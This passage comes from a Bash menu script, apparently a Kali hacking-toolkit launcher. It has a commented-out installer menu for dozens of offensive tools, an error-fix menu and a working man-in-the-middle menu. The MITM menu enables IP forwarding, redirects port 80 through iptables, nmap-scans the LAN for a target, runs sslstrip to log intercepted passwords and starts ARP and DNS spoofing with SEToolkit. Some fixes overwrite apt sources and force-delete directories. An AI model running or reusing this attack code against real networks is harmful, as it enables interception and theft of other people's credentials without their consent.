]]\n\t\tthen\n\t\t\tNOCONFIRM=1\n\t\telse\n\t\t\tNOCONFIRM=0\n\t\tfi\n\telif [[ ! \"$ST\" -ge 1 ]]\n\tthen\n\t\tcontinue\n\telse\n\t\tSTF=$((ST-1))\n\t\tif [[ \"${selected[\"$STF\"]}\" == 1 ]]\n\t\tthen\n\t\t\tselected[\"$STF\"]=0\n\t\telse\n\t\t\tselected[\"$STF\"]=1\n\t\tfi\n\tfi\ndone\n#~ while true\n#~ do\n\t#~ cd\n\t#~ clear\n\t#~ TERMINALTITLE=\"INSTALL/REINSTALL A TOOL\"\n\t#~ dash_calc\n\t#~ printf '\\033]2;INSTALL/REINSTALL A TOOL\\a'\n\t#~ echo -e \"\"$BS\"Select a tool to install/reinstall\"$CE\"\"\n\t#~ echo -e \" \"$YS\"1\"$CE\") Fluxion      \"$YS\"21\"$CE\") 4nonimizer    \"$YS\"41\"$CE\") Infoga           \"$YS\"61\"$CE\") Wifi-Pumpkin\"\n\t#~ echo -e \"\"$YS\" 2\"$CE\") Wifite       \"$YS\"22\"$CE\") Openvas       \"$YS\"42\"$CE\") nWatch           \"$YS\"62\"$CE\") Veil-Framework\"\n\t#~ echo -e \"\"$YS\" 3\"$CE\") Wifiphisher  \"$YS\"23\"$CE\") BeeLogger     \"$YS\"43\"$CE\") Eternal scanner  \"$YS\"63\"$CE\") Leviathan\"\n\t#~ echo -e \"\"$YS\" 4\"$CE\") Zatacker     \"$YS\"24\"$CE\") Ezsploit      \"$YS\"44\"$CE\") Eaphammer        \"$YS\"64\"$CE\") FakeImageExploiter\"\n\t#~ echo -e \"\"$YS\" 5\"$CE\") Morpheus     \"$YS\"25\"$CE\") Pupy          \"$YS\"45\"$CE\") Dagon            \"$YS\"65\"$CE\") Avet\"\n\t#~ echo -e \"\"$YS\" 6\"$CE\") Osrfconsole  \"$YS\"26\"$CE\") Zirikatu      \"$YS\"46\"$CE\") Lalin            \"$YS\"66\"$CE\") Gloom\"\n\t#~ echo -e \"\"$YS\" 7\"$CE\") Hakku        \"$YS\"27\"$CE\") WiFi-autopwner\"$YS\"47\"$CE\") Knockmail        \"$YS\"67\"$CE\") Arcanus\"\n\t#~ echo -e \"\"$YS\" 8\"$CE\") Trity        \"$YS\"28\"$CE\") Bully         \"$YS\"48\"$CE\") Kwetza           \"$YS\"68\"$CE\") MSFPC\"\n\t#~ echo -e \"\"$YS\" 9\"$CE\") Cupp         \"$YS\"29\"$CE\") Anonsurf      \"$YS\"49\"$CE\") Ngrok            \"$YS\"69\"$CE\") MorphHTA\"\n\t#~ echo -e \"\"$YS\"10\"$CE\") Dracnmap     \"$YS\"30\"$CE\") Anonym8       \"$YS\"50\"$CE\") Bleachbit        \"$YS\"70\"$CE\") LFISuite\"\n\t#~ echo -e \"\"$YS\"11\"$CE\") Fern         \"$YS\"31\"$CE\") TheFatRat     \"$YS\"51\"$CE\") Vmr mdk          \"$YS\"71\"$CE\") UniByAv\"\n\t#~ echo -e \"\"$YS\"12\"$CE\") Netdiscover  \"$YS\"32\"$CE\") Angry IP      \"$YS\"52\"$CE\") Hash Buster      \"$YS\"72\"$CE\") Demiguise\"\n\t#~ echo -e \"\"$YS\"13\"$CE\") KickThemOut  \"$YS\"33\"$CE\") Sniper        \"$YS\"53\"$CE\") Findsploit       \"$YS\"73\"$CE\") Dkmc\"\n\t#~ echo -e \"\"$YS\"14\"$CE\") Ghost-Phisher\"$YS\"34\"$CE\") ReconDog      \"$YS\"54\"$CE\") Howdoi           \"$YS\"74\"$CE\") MITMf\"\n\t#~ echo -e \"\"$YS\"15\"$CE\") The Eye      \"$YS\"35\"$CE\") RED HAWK      \"$YS\"55\"$CE\") Operative-frmwork\"$YS\"75\"$CE\") Netool-toolkit\"\n\t#~ echo -e \"\"$YS\"16\"$CE\") Xerxes       \"$YS\"36\"$CE\") WinPayloads   \"$YS\"56\"$CE\") Netattack2       \"$YS\"76\"$CE\") Patator\"\n\t#~ echo -e \"\"$YS\"17\"$CE\") Mdk3-master  \"$YS\"37\"$CE\") Shellter      \"$YS\"57\"$CE\") Koadic           \"$YS\"77\"$CE\") Evil-Droid\"\n\t#~ echo -e \"\"$YS\"18\"$CE\") Katana       \"$YS\"38\"$CE\") CHAOS         \"$YS\"58\"$CE\") Empire           \"$YS\"78\"$CE\") NoSQLMap\"\n\t#~ echo -e \"\"$YS\"19\"$CE\") Airgeddon    \"$YS\"39\"$CE\") Routersploit  \"$YS\"59\"$CE\") Meterpr.-Paranoid\"\n\t#~ echo -e \"\"$YS\"20\"$CE\") Websploit    \"$YS\"40\"$CE\") Geany         \"$YS\"60\"$CE\") Dr0p1t\"\n\t#~ echo -e \"\"$YS\" b\"$CE\") Go back\"\n\t#~ echo -e \"\"$YS\" 0\"$CE\") Exit\"\n\t#~ echo -e \"Choose: \"\n\t#~ read REIN\n\t#~ clear\n\t#~ if [[ \"$REIN\" = \"1\" ]]\n\t#~ then\n\t\t#~ install_fluxion\t\t\n\t#~ elif [[ \"$REIN\" = \"2\" ]]\n\t#~ then\n\t\t#~ install_wifite\n\t#~ elif [[ \"$REIN\" = \"3\" ]]\n\t#~ then\n\t\t#~ install_wifiphisher\n\t#~ elif [[ \"$REIN\" = \"4\" ]]\n\t#~ then\n\t\t#~ install_zatacker\n\t#~ elif [[ \"$REIN\" = \"5\" ]]\n\t#~ then\n\t\t#~ install_morpheus\n\t#~ elif [[ \"$REIN\" = \"6\" ]]\n\t#~ then\n\t\t#~ install_osrframework\t\t\t\n\t#~ elif [[ \"$REIN\" = \"7\" ]]\n\t#~ then\n\t\t#~ install_hakku\n\t#~ elif [[ \"$REIN\" = \"8\" ]]\n\t#~ then\n\t\t#~ install_trity\n\t#~ elif [[ \"$REIN\" = \"9\" ]]\n\t#~ then\n\t\t#~ install_cupp\n\t#~ elif [[ \"$REIN\" = \"10\" ]]\n\t#~ then\n\t\t#~ install_dracnmap\n\t#~ elif [[ \"$REIN\" = \"11\" ]]\n\t#~ then\n\t\t#~ install_fern\n\t#~ elif [[ \"$REIN\" = \"12\" ]]\n\t#~ then\n\t\t#~ install_netdiscover\t\t\n\t#~ elif [[ \"$REIN\" = \"13\" ]]\n\t#~ then\n\t\t#~ install_kickthemout\n\t#~ elif [[ \"$REIN\" = \"14\" ]]\n\t#~ then\n\t\t#~ install_ghostphisher\n\t#~ elif [[ \"$REIN\" = \"15\" ]]\n\t#~ then\n\t\t#~ install_theeye\n\t#~ elif [[ \"$REIN\" = \"16\" ]]\n\t#~ then\n\t\t#~ install_xerxes\n\t#~ elif [[ \"$REIN\" = \"17\" ]]\n\t#~ then\n\t\t#~ install_mdk3\n\t#~ elif [[ \"$REIN\" = \"18\" ]]\n\t#~ then\n\t\t#~ install_katana\n\t#~ elif [[ \"$REIN\" = \"19\" ]]\n\t#~ then\n\t\t#~ install_airgeddon\n\t#~ elif [[ \"$REIN\" = \"20\" ]]\n\t#~ then\n\t\t#~ install_websploit\n\t#~ elif [[ \"$REIN\" = \"21\" ]]\n\t#~ then\n\t\t#~ install_4nonimizer\n\t#~ elif [[ \"$REIN\" = \"22\" ]]\n\t#~ then\n\t\t#~ install_openvas\n\t#~ elif [[ \"$REIN\" = \"23\" ]]\n\t#~ then\n\t\t#~ install_beelogger\n\t#~ elif [[ \"$REIN\" = \"24\" ]]\n\t#~ then\n\t\t#~ install_ezsploit\n\t#~ elif [[ \"$REIN\" = \"25\" ]]\n\t#~ then\n\t\t#~ install_pupy\n\t#~ elif [[ \"$REIN\" = \"26\" ]]\n\t#~ then\n\t\t#~ install_zirikatu\n\t#~ elif [[ \"$REIN\" = \"27\" ]]\n\t#~ then\n\t\t#~ install_wifiautopwner\n\t#~ elif [[ \"$REIN\" = \"28\" ]]\n\t#~ then\n\t\t#~ install_bully\n\t#~ elif [[ \"$REIN\" = \"29\" ]]\n\t#~ then\n\t\t#~ install_anonsurf\n\t#~ elif [[ \"$REIN\" = \"30\" ]]\n\t#~ then\n\t\t#~ install_anonym8\n\t#~ elif [[ \"$REIN\" = \"31\" ]]\n\t#~ then\t\n\t\t#~ install_thefatrat\n\t#~ elif [[ \"$REIN\" = \"32\" ]]\n\t#~ then\n\t\t#~ install_angryip\n\t#~ elif [[ \"$REIN\" = \"33\" ]]\n\t#~ then\n\t\t#~ install_sniper\n\t#~ elif [[ \"$REIN\" = \"34\" ]]\n\t#~ then\n\t\t#~ install_recondog\n\t#~ elif [[ \"$REIN\" = \"35\" ]]\n\t#~ then\n\t\t#~ install_redhawk\n\t#~ elif [[ \"$REIN\" = \"36\" ]]\n\t#~ then\n\t\t#~ install_winpayloads\n\t#~ elif [[ \"$REIN\" = \"37\" ]]\n\t#~ then\n\t\t#~ install_shellter\n\t#~ elif [[ \"$REIN\" = \"38\" ]]\n\t#~ then\n\t\t#~ install_chaos\n\t#~ elif [[ \"$REIN\" = \"39\" ]]\n\t#~ then\n\t\t#~ install_routersploit\n\t#~ elif [[ \"$REIN\" = \"40\" ]]\n\t#~ then\n\t\t#~ install_geany\n\t#~ elif [[ \"$REIN\" = \"41\" ]]\n\t#~ then\n\t\t#~ install_infoga\n\t#~ elif [[ \"$REIN\" = \"42\" ]]\n\t#~ then\n\t\t#~ install_nwatch\n\t#~ elif [[ \"$REIN\" = \"43\" ]]\n\t#~ then\n\t\t#~ install_eternalscanner\n\t#~ elif [[ \"$REIN\" = \"44\" ]]\n\t#~ then\n\t\t#~ install_eaphammer\n\t#~ elif [[ \"$REIN\" = \"45\" ]]\n\t#~ then\n\t\t#~ install_dagon\n\t#~ elif [[ \"$REIN\" = \"46\" ]]\n\t#~ then\n\t\t#~ install_lalin\n\t#~ elif [[ \"$REIN\" = \"47\" ]]\n\t#~ then\n\t\t#~ install_knockmail\n\t#~ elif [[ \"$REIN\" = \"48\" ]]\n\t#~ then\n\t\t#~ install_kwetza\n\t#~ elif [[ \"$REIN\" = \"49\" ]]\n\t#~ then\n\t\t#~ install_ngrok\n\t#~ elif [[ \"$REIN\" = \"50\" ]]\n\t#~ then\n\t\t#~ install_bleachbit\n\t#~ elif [[ \"$REIN\" = \"51\" ]]\n\t#~ then\n\t\t#~ install_vmr\n\t#~ elif [[ \"$REIN\" = \"52\" ]]\n\t#~ then\n\t\t#~ install_hashbuster\n\t#~ elif [[ \"$REIN\" = \"53\" ]]\n\t#~ then\n\t\t#~ install_findsploit\n\t#~ elif [[ \"$REIN\" = \"54\" ]]\n\t#~ then\n\t\t#~ install_howdoi\n\t#~ elif [[ \"$REIN\" = \"55\" ]]\n\t#~ then\n\t\t#~ install_operative\n\t#~ elif [[ \"$REIN\" = \"56\" ]]\n\t#~ then\n\t\t#~ install_netattack2\n\t#~ elif [[ \"$REIN\" = \"57\" ]]\n\t#~ then\n\t\t#~ install_koadic\n\t#~ elif [[ \"$REIN\" = \"58\" ]]\n\t#~ then\n\t\t#~ install_empire\n\t#~ elif [[ \"$REIN\" = \"59\" ]]\n\t#~ then\n\t\t#~ install_meterpreter_paranoid_mode\n\t#~ elif [[ \"$REIN\" = \"60\" ]]\n\t#~ then\n\t\t#~ install_dropit_frmw\n\t#~ elif [[ \"$REIN\" = \"61\" ]]\n\t#~ then\n\t\t#~ install_wifi_pumpkin\n\t#~ elif [[ \"$REIN\" = \"62\" ]]\n\t#~ then\n\t\t#~ install_veil\n\t#~ elif [[ \"$REIN\" = \"63\" ]]\n\t#~ then\n\t\t#~ install_leviathan\n\t#~ elif [[ \"$REIN\" = \"64\" ]]\n\t#~ then\n\t\t#~ install_fake_image\n\t#~ elif [[ \"$REIN\" = \"65\" ]]\n\t#~ then\n\t\t#~ install_avet\n\t#~ elif [[ \"$REIN\" = \"66\" ]]\n\t#~ then\n\t\t#~ install_gloom\n\t#~ elif [[ \"$REIN\" = \"67\" ]]\n\t#~ then\n\t\t#~ install_arcanus\n\t#~ elif [[ \"$REIN\" = \"68\" ]]\n\t#~ then\n\t\t#~ install_msfpc\n\t#~ elif [[ \"$REIN\" = \"69\" ]]\n\t#~ then\n\t\t#~ install_morphhta\n\t#~ elif [[ \"$REIN\" = \"70\" ]]\n\t#~ then\n\t\t#~ install_lfi\n\t#~ elif [[ \"$REIN\" = \"71\" ]]\n\t#~ then\n\t\t#~ install_unibyav\n\t#~ elif [[ \"$REIN\" = \"72\" ]]\n\t#~ then\n\t\t#~ install_demiguise\n\t#~ elif [[ \"$REIN\" = \"73\" ]]\n\t#~ then\n\t\t#~ install_dkmc\n\t#~ elif [[ \"$REIN\" = \"74\" ]]\n\t#~ then\n\t\t#~ install_mitmf\n\t#~ elif [[ \"$REIN\" = \"75\" ]]\n\t#~ then\n\t\t#~ install_netool\n\t#~ elif [[ \"$REIN\" = \"76\" ]]\n\t#~ then\n\t\t#~ install_patator\n\t#~ elif [[ \"$REIN\" = \"77\" ]]\n\t#~ then\n\t\t#~ install_evil_droid\n\t#~ elif [[ \"$REIN\" = \"78\" ]]\n\t#~ then\n\t\t#~ install_nosqlmap\n\t#~ elif [[ \"$REIN\" = \"back\" || \"$REIN\" = \"b\" ]]\n\t#~ then\n\t\t#~ clear\n\t\t#~ break\n\t#~ elif [[ \"$REIN\" = \"00\" ]]\n\t#~ then\t\n\t\t#~ exec bash \"$0\"\n\t#~ elif [[ \"$REIN\" = \"0\" ]]\n\t#~ then\n\t\t#~ clear\n\t\t#~ exit\n\t#~ fi\n\t#~ done\n}\nfunction errors_menu\n{\nwhile true\ndo\nclear\nTERMINALTITLE=\"ERRORS\"\ndash_calc\nprintf '\\033]2;ERRORS\\a'\necho -e \"\"$YS\" 1\"$CE\") Fix no audio issue\"\necho -e \"\"$YS\" 2\"$CE\") No output in wash\"\necho -e \"\"$YS\" 3\"$CE\") No full screen\"\necho -e \"\"$YS\" 4\"$CE\") Error constructing proxy for org.gnome.Terminal\"\necho -e \"\"$YS\" 5\"$CE\") Error starting apache2 service\"\necho -e \"\"$YS\" 6\"$CE\") Errors when apt-get update\"\necho -e \"\"$YS\" 7\"$CE\") Errors when creating a payload with Winpayloads\"\necho -e \"\"$YS\" 8\"$CE\") Complete fix for apache2 service failed to start\"\necho -e \"\"$YS\" 9\"$CE\") Cannot capture handshake-pyrit verification always bad\"\necho -e \"\"$YS\" b\"$CE\") Go back\"\necho -e \"\"$YS\" 0\"$CE\") EXIT\"\necho -e \" Choose: \"\nread ERRS\nclear\nif [[ \"$ERRS\" = \"1\" ]]\nthen\n\tclear\n\techo -e \"Trying to get you some audio...\"\n\tsleep 2\n\tclear\n\techo -e \"Press \"$YS\"y\"$CE\" if/when prompted\"\n\tsleep 3\n\tclear\n\techo -e \"Installing pulseaudio.......\"\n\tsleep 1\n\tapt-get pulseaudio\n\techo -e \"Enabling pulseaudio.......\"\n\tsleep 1\n\tsystemctl --user enable pulseaudio && systemctl --user start pulseaudio\n\tclear\n\techo -e \"Done!\"\n\tsleep 1\n\tclear\n\techo -e \"I mean...Try to see if you have audio.\"\n\tsleep 3\n\techo -e \" \"\n\techo -e \"That's all i can do :/\"\n\tsleep 2\n\techo -e \" \"\n\techo -e \"If it wasn't fix , then try rebooting\"\nelif [[ \"$ERRS\" = \"2\" ]]\nthen\n\tclear\n\techo -e \"Ok...Lets try to fix this...\"\n\tsleep 1\n\tmkdir /etc/reaver\n\techo -e \"It seems to be fixed.\"\n\techo -e \"Enter you interface\"\n\tread INTWASH\n\techo -e \"Press \"$YS\"many key\"$CE\" to test wash\"\n\techo -e \"Also try \"wash -i wlan0mon -a\" to display all networks\"\n\twash -i $INTWASH\nelif [[ \"$ERRS\" = \"3\" ]]\nthen\n\tapt-get install -y open-vm-tools-desktop fuse\n\techo -e \"Restart your vistual machine...\"\n\tsleep 2\n\techo -e \"$PAKTGB\"\n\t$READAK\nelif [[ \"$ERRS\" = \"4\" ]]\nthen\n\tlocale-gen\n\tlocalectl set-locale LANG=\"en_US.UTF-8\"\n\tsleep 2\n\techo -e \"Reboot your system now\"\n\tsleep 3\nelif [[ \"$ERRS\" = \"5\" ]]\nthen\n\tservice nginx stop\n\techo -e \"I think i fixed it. Try again: service apache2 start \"\n\tsleep 5\nelif [[ \"$ERRS\" = \"6\" ]]\nthen\n\techo \"deb http://http.kali.org/kali kali-rolling main non-free contrib\" > /etc/apt/sources.list\n\trm -r -f /etc/apt/sources.list.d/*\n\techo -e \"Try   apt-get update    again. That's all i can do.\"\n\tsleep 3\nelif [[ \"$ERRS\" = \"7\" ]]\nthen\n\trm -f -r /usr/local/lib/python2.7/dist-packages/Crypto\n\techo -e \"Error was fixed!\"\n\techo -e \"$PAKTGB\"\n\t$READAK\nelif [[ \"$ERRS\" = \"8\" ]]\nthen\n\tapt-get -y remove nginx\n\tapt-get -y remove nginx-full\n\tapt-get -y remove nginx-common\n\tapt-get -y autoremove\n\tclear\n\techo -e \"Error was fixed!\"\n\techo -e \"$PAKTGB\"\n\t$READAK\nelif [[ \"$ERRS\" = \"9\" ]]\nthen\n\twget -O /tmp/scapy2.3.2.tar.gz https://pypi.python.org/packages/6d/72/c055abd32bcd4ee6b36ef8e9ceccc2e242dea9b6c58fdcf2e8fd005f7650/scapy-2.3.2.tar.gz; sudo pip2 install /tmp/scapy2.3.2.tar.gz\n\tclear\n\techo -e \"Error was fixed!\"\n\techo -e \"$PAKTGB\"\n\t$READAK\nelif [[ \"$ERRS\" = \"back\" || \"$ERRS\" = \"b\" || \"$ERRS\" = 00 ]]\nthen\n\tBACKL=\"1\"\n\tbreak\nelif [[ \"$ERRS\" = \"0\" ]]\nthen\n\tclear\n\texit\nelse\n\tclear\n\techo -e \"Not a valid option....\"\n\tsleep 2\nfi\ndone\n}\nfunction keyboard_shortcuts\n{\nif [[ ! -d \"\"$KSPATH\"\" ]]\nthen\n\tmkdir \"$KSPATH\"\nfi\nwhile true\ndo\nTERMINALTITLE=\"KEYBOARD SHORTCUTS\"\ndash_calc\nprintf '\\033]2;KEYBOARD SHORTCUTS\\a'\necho -e \"\"$YS\" 1\"$CE\") Tools\"\necho -e \"\"$YS\" 2\"$CE\") See hidden shortcuts\"\necho -e \"\"$YS\" b\"$CE\") Go back\"\n#~ echo -e \"\"$YS\"00\"$CE\") Main menu\"\necho -e \"\"$YS\" 0\"$CE\") EXIT\"\nread KS\nclear\nif [[ \"$KS\" = \"1\" ]]\nthen\n\twhile true\n\tdo\n\t\techo -e \"Available shortcuts:                        \"$YS\"reset\"$CE\") Delete all shortcuts\"\n\t\tnn=1\n\t\t#start sorting out all the available shortcuts\n\t\tHOWADD=$(( HOWMANYTOOLS + 1 )) \n\t\twhile [ \"$nn\" != \"$HOWADD\" ]\n\t\tdo\n\t\tlistshortcuts\n\t\t#adding a space where needed on the output,so it will be sorted correctly\n\t\tif [[ \"$nn\" -lt \"10\" ]]\n\t\tthen\n\t\t\tn=\" $nn\"\n\t\telse\n\t\t\tn=\"$nn\"\n\t\tfi\n\t\tif [[ ! -f \"\"$KSPATH\"/\"$TITLE\"/\"$TITLE\".txt\" ]]\n\t\tthen\n\t\t\techo -e \"\"$YS\"\"$n\"\"$CE\") \"$TITLE\"\"\n\t\telse\n\t\t\tread KSKS < \"$KSPATH\"/\"$TITLE\"/\"$TITLE\"ks.txt\n\t\t\tif [[ \"$KSKS\" = \"\" ]]\n\t\t\tthen\n\t\t\t\tKSKS=\"ERROR(fix=recreate the shortcut)\"\n\t\t\telse\n\t\t\t\tread currentks < \"$KSPATH\"/\"$TITLE\"/\"$TITLE\"ks.txt\n\t\t\t\tsize=${#TITLE}\n\t\t\t\tcalc=$(( 35-size ))\n\t\t\t\tnumcalc=1\n\t\t\t\tSPACES=\"\"\n\t\t\t\twhile [ $numcalc != $calc ]\n\t\t\t\tdo\n\t\t\t\t\tSPACES=\"\"$SPACES\"_\"\n\t\t\t\t\tnumcalc=$(( numcalc+1 ))\n\t\t\t\tdone\n\t\t\t\t#~ read SPACES < \"$KSPATH\"/spaces.txt\n\t\t\t\techo -e \"\"$YS\"\"$n\"\"$CE\") \"$TITLE\"\"$SPACES\"\"$KSKS\"\"\n\t\t\tfi\n\t\tfi\n\t\tnn=$(( nn+1 ))\n\t\tdone\n\t\techo -e \"\"$YS\" b\"$CE\") Go back\"\n\t\t#echo -e \"\"$YS\" 0\"$CE\") EXIT\"\n\t\techo -e \"Choose: \"\n\t\t#nn=\"\"\n\t\tread nn\n\t\tclear\n\t\tlistshortcuts\n\t\tif [[ \"$nn\" = \"\" ]]\n\t\tthen\n\t\t\tcontinue\n\t\tfi\n\t\tif [[ \"$nn\" = \"back\" || \"$nn\" = \"b\" ]]\n\t\tthen\n\t\t\tclear\n\t\t\tbreak\n\t\telif [[ \"$nn\" = \"0\" ]]\n\t\tthen\n\t\t\tclear\n\t\t\texit\n\t\telif [[ \"$nn\" = \"00\" ]]\n\t\tthen\n\t\t\texec bash \"$0\"\n\t\telif [[ \"$nn\" = \"reset\" ]]\n\t\tthen\n\t\t\trm -r \"$KSPATH\"/*\n\t\telif [[ \"$nn\" -le \"$HOWMANYTOOLS\" ]]\n\t\tthen\n\t\t\tcreateshortcut\n\t\tfi\n\t\tdone\n\telif [[ \"$KS\" = \"2\" ]]\n\tthen\n\t\thidden_shortcuts\n\telif [[ \"$KS\" = \"back\" || \"$KS\" = \"b\" ]]\n\tthen\n\t\tBACKL=\"1\"\n\t\tclear\n\t\tbreak\n\telif [[ \"$KS\" = \"0\" ]]\n\tthen\n\t\tclear\n\t\texit\n\telif [[ \"$KS\" = \"00\" ]]\n\tthen\n\t\texec bash \"$0\"\n\tfi\ndone\n}\nfunction mitm_menu\n{\nclear\nTERMINALTITLE=\"MITM\"\ndash_calc\nprintf '\\033]2;MITM\\a'\necho -e \"\"$YS\" 1\"$CE\") Password sniff-sslstrip\"\necho -e \"\"$YS\" 2\"$CE\") SET + mitm + dnsspoofing\"\necho -e \"\"$YS\" b\"$CE\") Go back\"\necho -e \"\"$YS\" 0\"$CE\") EXIT\"\nread MITMATT\nclear\nif [[ \"$MITMATT\" = \"1\" ]]\nthen\n\twhile true\n\tdo\n\tclear\n\techo -e \"------------------------------\"$RS\"MITM\"$CE\"-------------------------------\"\n\techo -e \"\"$YS\" 1\"$CE\") Enable ip_forward                 \"$YS\"d1\"$CE\") Disable ip_forward \"\n\techo -e \"\"$YS\" 2\"$CE\") Set iptables\"\n\techo -e \"\"$YS\" 3\"$CE\") Scan and select target IP         \"$YS\"33\"$CE\") I have scaned\"\n\techo -e \"\"$YS\" 4\"$CE\") Open the sslstrip log\"            # \"$YS\"44\"$CE\") Filter credentials\"\n\techo -e \"\"$YS\" b\"$CE\") Go back\"\n\techo -e \"\"$YS\" 0\"$CE\") EXIT\"\n\techo -e \"Choose: \"\n\tread -e MITMCH\n\tif [[ \"$MITMCH\" = \"1\" ]]\n\tthen\n\t\techo \"1\" > /proc/sys/net/ipv4/ip_forward\n\t\techo -e \"Done.\"\n\t\tsleep 1\n\telif [[ \"$MITMCH\" = \"d1\" ]]\n\tthen\n\t\techo \"0\" > /proc/sys/net/ipv4/ip_forward\n\t\techo -e \"Done.\"\n\t\tsleep 1\n\telif [[ \"$MITMCH\" = \"2\" ]]\n\tthen\n\t\tclear\n\t\techo -e \"Redirect tcp port 80 to port(\"$YS\"Enter\"$CE\"=8080):\"\n\t\tread PORTTCP\n\t\tif [[ \"$PORTTCP\" = \"\" ]]\n\t\tthen\n\t\t\tPORTTCP=\"8080\"\n\t\tfi\n\t\t\t\t\tclear\n\t\techo -e \"Redirect udp port 40 to port(\"$YS\"Enter\"$CE\"=40):\"\n\t\tread PORTUDP\n\t\tif [[ \"$PORTUDP\" = \"\" ]]\n\t\tthen\n\t\t\tPORTUDP=\"40\"\n\t\tfi\n\t\tiptables --flush\n\t\tiptables --flush -t nat\n\t\tiptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $PORTTCP\n\t\tiptables -t nat -A PREROUTING -p udp --destination-port 40 -j REDIRECT --to-port $PORTUDP\n\t\techo -e \"Done.\"\n\t\tsleep 1\n\telif [[ \"$MITMCH\" = \"3\" ]]\n\tthen\n\t\tclear\n\t\troute -n\n\t\techo -e \"\"\n\t\techo -e \"\"\n\t\techo -e \"Enter your gateway(prefer \"$ETH\" gateway):\"\n\t\tread GATENM\n\t\techo -e \"\"\n\t\techo -e \"Enter the gateway's interface(\"$YS\"Enter\"$CE\"=\"$ETH\"):\"\n\t\tread GATEINT\n\t\tif [[ \"$GATEINT\" = \"\" ]]\n\t\tthen\n\t\t\tGATEINT=\"$ETH\"\n\t\tfi\t\n\t\twhile true\n\t\tdo\t\n\t\tclear\n\t\tnmap -sP \"$GATENM\"/24\n\t\techo -e \"\"\n\t\techo -e \"\"\n\t\techo -e \"Enter your target IP:\"\n\t\tread TARGIP\n\t\tif [[ \"$TARGIP\" = \"r\" ]]\n\t\tthen\n\t\t\tcontinue\n\t\telse\n\t\t\tbreak\n\t\tfi\n\t\tdone\n\t\techo -e \"\"\n\t\techo -e \"$PAKTC\"\n\t\t$READAK\n\t\texport GATENM\n\t\texport GATEINT\n\t\texport TARGIP\n\t\texport PORTTCP\n\t\texport PORTUDP\n\t\tcd \"$LPATH\"/ls\n\t\tgnome-terminal --geometry 60x12+0+999999 -e ./l131.sh\n\t\tgnome-terminal --geometry 60x20+999999+999999 -e ./l133.sh\n\t\tgnome-terminal --geometry 60x20+999999+0 -e ./l132.sh\n\t\tsslstrip -l $PORTTCP -w /root/sslstrip.log\n\t\techo -e \"$PAKTGB\"\n\t\t$READAK\n\t\tcontinue\n\telif [[ \"$MITMCH\" = \"33\" ]]\n\tthen\n\t\tclear\n\t\techo -e \"Enter your gateway(prefer \"$ETH\" gateway):\"\n\t\tread GATENM\n\t\techo -e \"\"\n\t\techo -e \"Enter the gateway's interface(\"$YS\"Enter\"$CE\"=\"$ETH\"):\"\n\t\tread GATEINT\n\t\tif [[ \"$GATEINT\" = \"\" ]]\n\t\tthen\n\t\t\tGATEINT=\"$ETH\"\n\t\tfi\n\t\tclear\n\t\techo -e \"Enter your target IP(\"$YS\"r\"$CE\"=rescan):\"\n\t\tread TARGIP\n\t\techo -e \"\"\n\t\techo -e \"$PAKTC\"\n\t\t$READAK\n\t\texport GATENM\n\t\texport GATEINT\n\t\texport TARGIP\n\t\texport PORTTCP\n\t\texport PORTUDP\n\t\tcd \"$LPATH\"/ls\n\t\tgnome-terminal --geometry 60x25+0+999999 -e ./l131.sh\n\t\tgnome-terminal --geometry 60x25+999999+0 -e ./l132.sh\n\t\tgnome-terminal --geometry 60x25+999999+999999 -e ./l133.sh\n\t\tsslstrip -l $PORTTCP -w /root/sslstrip.log\n\t\techo -e \"$PAKTGB\"\n\t\t$READAK\n\t\tcontinue\n\telif [[ \"$MITMCH\" = \"4\" ]]\n\tthen\n\t\tleafpad /root/sslstrip.log\n\t#~ elif [[ \"$MITMCH\" = \"44\" ]]\n\t#~ then\n\telif [[ \"$MITMCH\" = \"back\" || \"$MITMCH\" = \"b\" ]]\n\tthen\n\t\tclear\n\t\tbreak\n\telif [[ \"$MITMCH\" = \"00\" ]]\n\tthen\n\t\tclear\n\t\texec bash \"$0\"\n\telif [[ \"$MITMCH\" = \"0\" ]]\n\tthen\n\t\tclear\n\t\texit\n\tfi\n\tdone\nelif [[ \"$MITMATT\" = \"2\" ]]\nthen\n\twhile true\n\tdo\n\tclear\n\techo -e \"------------------------------\"$RS\"MITM\"$CE\"-------------------------------\"\n\techo -e \"\"$YS\" 1\"$CE\") Enable ip_forward                 \"$YS\"d1\"$CE\") Disable ip_forward\"\n\techo -e \"\"$YS\" 2\"$CE\") Scan and select target IP         \"$YS\"22\"$CE\") I have scaned\"\n\techo -e \"\"$YS\" 3\"$CE\") Start ARPspoofing\"\n\t#~ echo -e \"\"$YS\" 4\"$CE\") Start apache2 service             \"$YS\"d4\"$CE\") Stop apache2 service\"\n\techo -e \"\"$YS\" 4\"$CE\") Start SEToolkit\"\n\techo -e \"\"$YS\" 5\"$CE\") Start DNSspoofing\"\n\techo -e \"\"$YS\" b\"$CE\") Go back\"\n\techo -e \"\"$YS\" 0\"$CE\") EXIT\"\n\techo -e \"Choose: \"\n\tread -e MITMSET\n\tclear\n\tif [[ \"$MITMSET\" = \"1\" ]]\n\tthen\n\t\techo \"1\" > /proc/sys/net/ipv4/ip_forward\n\t\techo -e \"Done.\"\n\t\tsleep 1\n\telif [[ \"$MITMSET\" = \"d1\" ]]\n\tthen\n\t\techo \"0\" > /proc/sys/net/ipv4/ip_forward\n\t\techo -e \"Done.\"\n\t\tsleep 1\n\telif [[ \"$MITMSET\" = \"2\" ]]\n\tthen\n\t\troute -n\n\t\techo -e \"\"\n\t\techo -e \"\"\n\t\techo -e \"Enter your gateway:\"\n\t\tread GATENM\n\t\techo -e \"\"\n\t\techo -e \"Enter the gateway's interface(e.g: wlan0):\"\n\t\tread GATEINT\n\t\twhile true\n\t\tdo\t\t\n\t\tclear\n\t\tnmap -sP \"$GATENM\"/24\n\t\techo -e \"\"\n\t\techo -e \"\"\n\t\techo -e \"Enter your target IP(\"$YS\"r\"$CE\"=rescan):\"\n\t\tread TARGIP\n\t\tif [[ \"$TARGIP\" = \"r\" ]]\n\t\tthen\n\t\t\tcontinue\n\t\telse\n\t\t\tbreak\n\t\tfi\n\t\tdone\n\telif [[ \"$MITMSET\" = \"22\" ]]\n\tthen\n\t\techo -e \"Enter your gateway:\"\n\t\tread GATENM\n\t\techo -e \"\"\n\t\techo -e \"Enter the gateway's interface(e.g: wlan0):\"\n\t\tread GATEINT\n\t\tclear\n\t\techo -e \"Enter your target IP:\"\n\t\tread TARGIP\n\telif [[ \"$MITMSET\" = \"3\" ]]\n\tthen\n\t\texport PAKTC\n\t\texport GATEINT\n\t\texport TARGIP\n\t\texport GATENM\n\t\tcd 